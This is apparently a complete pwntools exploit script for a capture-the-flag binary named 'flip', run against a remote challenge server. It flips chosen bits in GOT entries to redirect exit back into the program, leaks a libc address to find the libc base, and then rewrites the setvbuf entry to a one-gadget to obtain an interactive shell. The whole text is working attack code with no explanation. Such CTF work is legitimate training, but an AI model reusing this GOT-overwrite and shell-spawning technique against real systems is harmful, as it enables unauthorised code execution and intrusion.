from pwn import *

#p=process('./flip')
p=remote('flip.tghack.no',1947)
e=ELF('./flip')

flips = {'exit_start':{'base':e.got['exit'],'orig':0x400766,'obj':0x400770},
        'exit_main':{'base':e.got['exit'],'orig':0x400770,'obj':0x400940},
        'welcome_alarm':{'base':0x601080,'orig':0x400b51,'obj':e.got['alarm']},
        'main_start':{'base':e.got['exit'],'orig':0x400940,'obj':0x400770},
        }

def find_bit_target(base,orig,obj):
    diff = bin(orig ^ obj)[2:]
    diff = diff.rjust(len(diff)+8-len(diff)%8,'0')
    diff = str(diff)
    
    diff_bytes = [diff[idx:idx+8] for idx in range(0,len(diff),8)]

    res=[]
    for byte_idx,byte in enumerate(diff_bytes):
        for bit_idx,bit in enumerate(byte):
            if bit=='1':
                res.append(hex(base+len(diff_bytes)-1-byte_idx)+':'+str(7-bit_idx))
    return res

def flip_one(target,idx):
    p.sendline(hex(target)+':'+str(idx))

def flip(target,fit=1):
    bit_targets = find_bit_target(flips[target]['base'],flips[target]['orig'],flips[target]['obj'] )
    if fit:
        for _ in range((5-(len(bit_targets)%5))%5):
            bit_targets.append('0x601000:0')
    
    for bit_target in bit_targets:
        p.sendlineafter('Enter addr:bit to flip: ',bit_target)


flip('exit_start')
flip('welcome_alarm')
leak = p.recvuntil('Have a nice day :)\n')
lb = u64(p.recvline()[:-1]+'\x00'*2) - 0xe4840
setvbuf = lb+0x812f0
og = lb+0x4f322
success('libc_base: {}'.format(hex(lb)))

flip('exit_main')

flips.update({'solve':{'base':e.got['setvbuf'],'orig':setvbuf,'obj':og}})
flip('solve')
flip('main_start')

p.interactive()
